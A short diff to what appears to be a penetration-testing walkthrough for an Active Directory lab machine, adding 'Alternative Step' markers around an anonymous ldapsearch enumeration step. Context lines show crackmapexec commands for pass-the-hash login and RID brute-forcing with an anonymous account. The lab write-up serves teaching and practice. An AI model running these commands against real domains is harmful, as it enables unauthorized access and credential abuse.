@@ -436,6 +436,8 @@ crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
+<🔄 Alternative Step>
+
 `ldapsearch -x -H ldap://192.168.56.128/ -s base -b '' "(objectClass=*)" "*" +`:
 ```
 # extended LDIF
@@ -552,6 +554,8 @@ result: 0 Success
 # numResponses: 2
 # numEntries: 1
 ```
+
+</🔄 Alternative Step>
 
 `crackmapexec smb 192.168.56.128 -d 'SOUPEDECODE.LOCAL' -u 'anonymous' -p '' --rid-brute`:
 ```
